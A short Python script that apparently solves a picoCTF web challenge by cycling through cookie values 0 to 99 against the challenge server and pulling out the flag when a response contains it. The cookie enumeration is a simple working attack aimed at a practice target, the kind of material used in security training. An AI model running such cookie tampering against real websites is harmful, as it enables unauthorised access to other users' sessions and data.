#!/bin/python
import requests
import re

url = 'http://mercury.picoctf.net:54219/check'
for i in range(100):
    cookie = 'name={}'.format(i)
    headers = {'Cookie':cookie}
 
    text = requests.get(url, headers=headers).text

    if "picoCTF" in text:
        print(f"cookie: {i} successfull")
        flag = re.findall("picoCTF{.*}", text)[0]
        print(f"flag: {flag}")
        break

    print(f"{i} attempt unsuccessful")
